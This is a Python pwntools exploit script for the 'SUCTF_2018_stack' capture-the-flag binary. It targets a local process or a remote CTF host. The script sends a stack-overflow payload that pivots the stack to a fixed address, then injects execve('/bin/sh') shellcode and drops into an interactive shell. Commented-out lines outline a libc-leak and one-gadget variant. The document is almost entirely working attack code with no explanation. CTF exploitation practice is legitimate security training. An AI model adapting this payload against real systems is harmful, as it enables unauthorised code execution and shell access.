import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./SUCTF_2018_stack')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./SUCTF_2018_stack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26953)
			elf=ELF('./SUCTF_2018_stack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		
		shell1='''
		mov rax, 0x68732f6e69622f
		push rax
		mov rdi,rsp
		xor rsi,rsi
		xor rdx,rdx
		mov rax,0x3b
		syscall
		'''
		shell=asm(shell1)
		print len(shell)
		pay='\x00'*0x20+p64(0x601100)+p64(0x400694)
		io.recv()
		# gdb.attach(io)
		io.send(pay)
		io.recv()
		pay=shell+'\x00'*0x3+p64(0x601100)+p64(0x601100-0x20)
		io.send(pay)


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue